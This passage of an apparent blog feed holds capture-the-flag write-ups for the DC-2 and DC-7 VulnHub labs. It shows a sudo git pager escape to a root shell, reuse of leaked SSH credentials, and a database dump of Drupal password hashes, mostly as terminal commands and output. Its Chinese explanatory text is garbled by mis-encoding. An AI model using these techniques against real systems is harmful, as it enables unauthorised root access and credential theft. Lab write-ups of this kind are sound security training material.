objects</span><br><span class="line">   status     Show the working tree status</span><br><span class="line">   tag        Create, list, delete or verify a tag object signed with GPG</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;git help -a&#x27;</span> and <span class="string">&#x27;git help -g&#x27;</span> lists available subcommands and some</span><br><span class="line">concept guides. See <span class="string">&#x27;git help &lt;command&gt;&#x27;</span> or <span class="string">&#x27;git help &lt;concept&gt;&#x27;</span></span><br><span class="line">to <span class="built_in">read</span> about a specific subcommand or concept.</span><br><span class="line">jerry@DC-2:~$ </span><br></pre></td></tr></table></figure>

<h2 id="0x12-ææƒ"><a href="#0x12-ææƒ" class="headerlink" title="0x12.ææƒ"></a>0x12.ææƒ</h2><p><code>å¼ºåˆ¶è¿›å…¥äº¤äº’é¡µé¢</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git -p --<span class="built_in">help</span> config</span><br><span class="line">GIT-CONFIG(1)                                                                 Git Manual                                                                 GIT-CONFIG(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       git-config - Get and <span class="built_in">set</span> repository or global options</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] name [value [value_regex]]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] --add name value</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] --replace-all name value [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get-all name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get-regexp name_regex [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get-urlmatch name URL</span><br><span class="line">       git config [&lt;file-option&gt;] --<span class="built_in">unset</span> name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] --<span class="built_in">unset</span>-all name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] --rename-section old_name new_name</span><br><span class="line">       git config [&lt;file-option&gt;] --remove-section name</span><br><span class="line">       git config [&lt;file-option&gt;] [-z|--null] -l | --list</span><br><span class="line">       git config [&lt;file-option&gt;] --get-color name [default]</span><br><span class="line">       git config [&lt;file-option&gt;] -e | --edit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       You can query/<span class="built_in">set</span>/replace/<span class="built_in">unset</span> options with this <span class="built_in">command</span>. The name is actually the section and the key separated by a dot, and the value will be escaped.</span><br><span class="line"></span><br><span class="line">       Multiple lines can be added to an option by using the --add option. If you want to update or <span class="built_in">unset</span> an option <span class="built_in">which</span> can occur on multiple lines, a POSIX regexp</span><br><span class="line">       value_regex needs to be given. Only the existing values that match the regexp are updated or <span class="built_in">unset</span>. If you want to handle the lines that <span class="keyword">do</span> not match the</span><br><span class="line">       regex, just prepend a single exclamation mark <span class="keyword">in</span> front (see also the section called â€œEXAMPLESâ€).</span><br><span class="line"></span><br><span class="line">       The <span class="built_in">type</span> specifier can be either --int or --bool, to make git config ensure that the variable(s) are of the given <span class="built_in">type</span> and convert the value to the canonical</span><br><span class="line">       form (simple decimal number <span class="keyword">for</span> int, a <span class="string">&quot;true&quot;</span> or <span class="string">&quot;false&quot;</span> string <span class="keyword">for</span> bool), or --path, <span class="built_in">which</span> does some path expansion (see --path below). If no <span class="built_in">type</span> specifier</span><br><span class="line">       is passed, no checks or transformations are performed on the value.</span><br><span class="line"></span><br><span class="line">       When reading, the values are <span class="built_in">read</span> from the system, global and repository <span class="built_in">local</span> configuration files by default, and options --system, --global, --<span class="built_in">local</span> and</span><br><span class="line">:</span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œ!/bin/bash</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line">root@DC-2:/home/jerry<span class="comment"># cd /root</span></span><br><span class="line">root@DC-2:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@DC-2:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@DC-2:~<span class="comment"># ls</span></span><br><span class="line">final-flag.txt</span><br><span class="line">root@DC-2:~<span class="comment"># cat final-flag.txt </span></span><br><span class="line">ual                                                                 GIT-CONFIG(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">egex]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">&#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line">root@DC-2:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-7</title>
    <url>/2020/08/28/DC-7/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>While this isnâ€™t an overly technical challenge, it isnâ€™t exactly easy.</p>
<p>While itâ€™s kind of a logical progression from an earlier DC release (I wonâ€™t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably wonâ€™t succeed.</p>
<p>What you will need to do, is to think â€œoutsideâ€ of the box.</p>
<p>Waaaaaay â€œoutsideâ€ of the box. :-)</p>
<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-è€è§„çŸ©nmap"><a href="#0x01-è€è§„çŸ©nmap" class="headerlink" title="0x01.è€è§„çŸ©nmap"></a>0x01.è€è§„çŸ©nmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ8å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 05:50 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0034s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.061s latency).</span><br><span class="line">MAC Address: AC:BD:70:18:C0:9F (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80ç«¯å£ï¼Œä¸”Drupalçš„ç‰ˆæœ¬ä¸º8</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># nmap -sC -sV -v 192.168.1.8 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 05:57 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 05:57</span><br><span class="line">Scanning 192.168.1.8 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 05:57, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 05:57</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 05:57, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 05:57</span><br><span class="line">Scanning 192.168.1.8 [1000 ports]</span><br><span class="line">Discovered open port 22/tcp on 192.168.1.8</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.8</span><br><span class="line">Completed SYN Stealth Scan at 05:57, 0.06s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 05:57</span><br><span class="line">Scanning 2 services on 192.168.1.8</span><br><span class="line">Completed Service scan at 05:57, 7.05s elapsed (2 services on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.8.</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 1.62s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.01s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)</span><br><span class="line">|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)</span><br><span class="line">|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST HEAD OPTIONS</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/ </span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ </span><br><span class="line">| /user/password/ /user/login/ /user/<span class="built_in">logout</span>/ /index.php/admin/ </span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">MAC Address: 00:0C:29:B7:50:22 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Initiating NSE at 05:57</span><br><span class="line">Completed NSE at 05:57, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.29 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><p><code>å‘ç°ä¸€äº›ä¿¡æ¯ï¼Œæˆ‘éœ€è¦åœ¨ç›’å­å¤–é¢æ€è€ƒï¼Œè€Œä¸æ˜¯å»æš´åŠ›ç ´è§£</code></p>
<img src="/2020/08/28/DC-7/image-20200828180306232.png" class>

<p><code>æ‰¾äº†ä¸€åœˆä¹Ÿæ²¡å‘ç°å•¥ï¼Œä½†åœ¨åº•éƒ¨å‘ç°äº†ä¸€ä¸ªç”¨æˆ·çº¿ç´¢ï¼Œè¿›è¡Œè°·æ­Œæœç´¢ã€‚</code></p>
<img src="/2020/08/28/DC-7/image-20200828181710970.png" class>

<p><code>ç‚¹å‡»ç¬¬ä¸€ä¸ª</code></p>
<img src="/2020/08/28/DC-7/image-20200828181801820.png" class>

<p><code>åªæœ‰ä¸€ä¸ªé¡¹ç›®ï¼Œç‚¹è¿›å»çœ‹çœ‹</code></p>
<img src="/2020/08/28/DC-7/image-20200828181847093.png" class>

<p><code>æŸ¥çœ‹readme.txtï¼Œç¡®å®è·ŸDC-7æœ‰å…³</code></p>
<img src="/2020/08/28/DC-7/image-20200828181930415.png" class>

<p><code>æŸ¥çœ‹é…ç½®æ–‡ä»¶</code></p>
<img src="/2020/08/28/DC-7/image-20200828182129655.png" class>

<p><code>å‘ç°ç”¨æˆ·åä¸å¯†ç </code></p>
<img src="/2020/08/28/DC-7/image-20200828182225320.png" class>

<h2 id="0x04-ç™»å…¥"><a href="#0x04-ç™»å…¥" class="headerlink" title="0x04.ç™»å…¥"></a>0x04.ç™»å…¥</h2><h3 id="1-å°è¯•ç™»å…¥web-applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†"><a href="#1-å°è¯•ç™»å…¥web-applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†" class="headerlink" title="1.å°è¯•ç™»å…¥web applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†"></a>1.å°è¯•ç™»å…¥web applicationï¼Œéœ¸ç‰¹å¤±è´¥äº†</h3><img src="/2020/08/28/DC-7/image-20200828182514271.png" class>

<h3 id="2-å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„"><a href="#2-å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„" class="headerlink" title="2.å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„"></a>2.å¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•sshç™»å…¥ï¼Œç»“æœæ˜¯å¯ä»¥çš„</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment"># ssh dc7user@192.168.1.8</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.8 (192.168.1.8)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:J5aG8w2iY0G0Nh3p4L+WzXXaQ7O1GjFTlfAYwkBIbM4.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.8<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">dc7user@192.168.1.8&#x27;</span>s password: </span><br><span class="line">Linux dc-7 4.9.0-9-amd64 <span class="comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Fri Aug 30 03:10:09 2019 from 192.168.0.100</span><br><span class="line">dc7user@dc-7:~$ whoami</span><br><span class="line">dc7user</span><br><span class="line">dc7user@dc-7:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x05-æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶"><a href="#0x05-æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶" class="headerlink" title="0x05.æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶"></a>0x05.æŸ¥çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œå¹¶å‘ç°ä¸€å°é‚®ä»¶</h2><p><code>å‘ç°å¼€å¯äº†3306</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ netstat -pantu</span><br><span class="line">-bash: netstat: <span class="built_in">command</span> not found</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br><span class="line">dc7user@dc-7:~$ ss -pantu</span><br><span class="line">Netid  State      Recv-Q Send-Q                         Local Address:Port                                        Peer Address:Port              </span><br><span class="line">udp    UNCONN     0      0                                          *:68                                                     *:*                  </span><br><span class="line">tcp    LISTEN     0      80                                 127.0.0.1:3306                                                   *:*                  </span><br><span class="line">tcp    LISTEN     0      128                                        *:22                                                     *:*                  </span><br><span class="line">tcp    LISTEN     0      20                                 127.0.0.1:25                                                     *:*                  </span><br><span class="line">tcp    ESTAB      0      0                                192.168.1.8:22                                           192.168.1.6:47064              </span><br><span class="line">tcp    LISTEN     0      128                                       :::80                                                    :::*                  </span><br><span class="line">tcp    LISTEN     0      128                                       :::22                                                    :::*                  </span><br><span class="line">tcp    LISTEN     0      20                                       ::1:25                                                    :::*                  </span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·ä¸å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:/var/www/html/sites/default$ cat settings.php</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="variable">$databases</span>[<span class="string">&#x27;default&#x27;</span>][<span class="string">&#x27;default&#x27;</span>] = array (</span><br><span class="line">  <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;d7db&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;db7user&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;yNv3Po00&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;namespace&#x27;</span> =&gt; <span class="string">&#x27;Drupal\\Core\\Database\\Driver\\mysql&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><code>ç™»å…¥æ•°æ®åº“ï¼Œå‘ç°adminå­˜åœ¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:/var/www/html/sites/default$ mysql -udb7user -pyNv3Po00</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 53</span><br><span class="line">Server version: 10.1.38-MariaDB-0+deb9u1 Debian 9.8</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| d7db               |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use d7db;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [d7db]&gt; show tables;</span><br><span class="line">+----------------------------------+</span><br><span class="line">| Tables_in_d7db                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| block_content                    |</span><br><span class="line">| block_content__body              |</span><br><span class="line">| block_content_field_data         |</span><br><span class="line">| block_content_field_revision     |</span><br><span class="line">| block_content_revision           |</span><br><span class="line">| block_content_revision__body     |</span><br><span class="line">| cache_bootstrap                  |</span><br><span class="line">| cache_config                     |</span><br><span class="line">| cache_container                  |</span><br><span class="line">| cache_data                       |</span><br><span class="line">| cache_default                    |</span><br><span class="line">| cache_discovery                  |</span><br><span class="line">| cache_dynamic_page_cache         |</span><br><span class="line">| cache_entity                     |</span><br><span class="line">| cache_menu                       |</span><br><span class="line">| cache_page                       |</span><br><span class="line">| cache_render                     |</span><br><span class="line">| cache_toolbar                    |</span><br><span class="line">| cachetags                        |</span><br><span class="line">| config                           |</span><br><span class="line">| file_managed                     |</span><br><span class="line">| file_usage                       |</span><br><span class="line">| flood                            |</span><br><span class="line">| <span class="built_in">history</span>                          |</span><br><span class="line">| key_value                        |</span><br><span class="line">| key_value_expire                 |</span><br><span class="line">| menu_link_content                |</span><br><span class="line">| menu_link_content_data           |</span><br><span class="line">| menu_link_content_field_revision |</span><br><span class="line">| menu_link_content_revision       |</span><br><span class="line">| menu_tree                        |</span><br><span class="line">| node                             |</span><br><span class="line">| node__body                       |</span><br><span class="line">| node__field_image                |</span><br><span class="line">| node__field_tags                 |</span><br><span class="line">| node_access                      |</span><br><span class="line">| node_field_data                  |</span><br><span class="line">| node_field_revision              |</span><br><span class="line">| node_revision                    |</span><br><span class="line">| node_revision__body              |</span><br><span class="line">| node_revision__field_image       |</span><br><span class="line">| node_revision__field_tags        |</span><br><span class="line">| queue                            |</span><br><span class="line">| router                           |</span><br><span class="line">| search_dataset                   |</span><br><span class="line">| search_index                     |</span><br><span class="line">| search_total                     |</span><br><span class="line">| semaphore                        |</span><br><span class="line">| sequences                        |</span><br><span class="line">| sessions                         |</span><br><span class="line">| shortcut                         |</span><br><span class="line">| shortcut_field_data              |</span><br><span class="line">| shortcut_set_users               |</span><br><span class="line">| taxonomy_index                   |</span><br><span class="line">| taxonomy_term__parent            |</span><br><span class="line">| taxonomy_term_data               |</span><br><span class="line">| taxonomy_term_field_data         |</span><br><span class="line">| taxonomy_term_field_revision     |</span><br><span class="line">| taxonomy_term_revision           |</span><br><span class="line">| taxonomy_term_revision__parent   |</span><br><span class="line">| url_alias                        |</span><br><span class="line">| user__roles                      |</span><br><span class="line">| user__user_picture               |</span><br><span class="line">| users                            |</span><br><span class="line">| users_data                       |</span><br><span class="line">| users_field_data                 |</span><br><span class="line">| watchdog                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">67 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [d7db]&gt; select * from users\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">     uid: 0</span><br><span class="line">    uuid: e813638d-3eb3-4212-af40-171dd51023e9</span><br><span class="line">langcode: en</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">     uid: 1</span><br><span class="line">    uuid: fd93872d-a854-44cd-bb08-eb9a11e46492</span><br><span class="line">langcode: en</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">     uid: 2</span><br><span class="line">    uuid: 68803de9-fc7b-4b7b-bce8-d04f11ac4c8a</span><br><span class="line">langcode: en</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: No query specified</span><br><span class="line"></span><br><span class="line">MariaDB [d7db]&gt; select * from users_field_data\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                     uid: 0</span><br><span class="line">                langcode: en</span><br><span class="line">      preferred_langcode: en</span><br><span class="line">preferred_admin_langcode: NULL</span><br><span class="line">                    name: </span><br><span class="line">                    pass: NULL</span><br><span class="line">                    mail: NULL</span><br><span class="line">                timezone: </span><br><span class="line">                  status: 0</span><br><span class="line">                 created: 1567054076</span><br><span class="line">                 changed: 1567054076</span><br><span class="line">                  access: 0</span><br><span class="line">                   login: 0</span><br><span class="line">                    init: NULL</span><br><span class="line">        default_langcode: 1</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">                     uid: 1</span><br><span class="line">                langcode: en</span><br><span class="line">      preferred_langcode: en</span><br><span class="line">preferred_admin_langcode: NULL</span><br><span class="line">                    name: admin</span><br><span class="line">                    pass: <span class="variable">$S</span><span class="variable">$Ead</span>.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F</span><br><span class="line">                    mail: admin@example.com</span><br><span class="line">                timezone: Australia/Melbourne</span><br><span class="line">                  status: 1</span><br><span class="line">                 created: 1567054076</span><br><span class="line">                 changed: 1567054076</span><br><span class="line">                  access: 1567098850</span><br><span class="line">                   login: 1567098643</span><br><span class="line">                    init: admin@example.com</span><br><span class="line">        default_langcode: 1</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">                     uid: 2</span><br><span class="line">                langcode: en</span><br><span class="line">      preferred_langcode: en</span><br><span class="line">preferred_admin_langcode: en</span><br><span class="line">                    name: dc7user</span><br><span class="line">                    pass: <span class="variable">$S</span><span class="variable">$EKe0kuKQvFhgFnEYMpq</span>.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI</span><br><span class="line">                    mail: dc7user@blah.com</span><br><span class="line">                timezone: Australia/Brisbane</span><br><span class="line">                  status: 1</span><br><span class="line">                 created: 1567057938</span><br><span class="line">                 changed: 1567057938</span><br><span class="line">                  access: 0</span><br><span class="line">                   login: 0</span><br><span class="line">                    init: dc7user@blah.com</span><br><span class="line">        default_langcode: 1</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: No query specified</span><br><span class="line"></span><br><span class="line">MariaDB [d7db]&gt; </span><br></pre></td></tr></table></figure>

<h2 id="0x06æŸ¥çœ‹é‚®ä»¶"><a href="#0x06æŸ¥çœ‹é‚®ä»¶" class="headerlink" title="0x06æŸ¥çœ‹é‚®ä»¶"></a>0x06æŸ¥çœ‹é‚®ä»¶</h2><p><code>å‘ç°ä¸€ä¸ªå¤‡ä»½è„šæœ¬/opt/scripts/backups.sh</code></p>
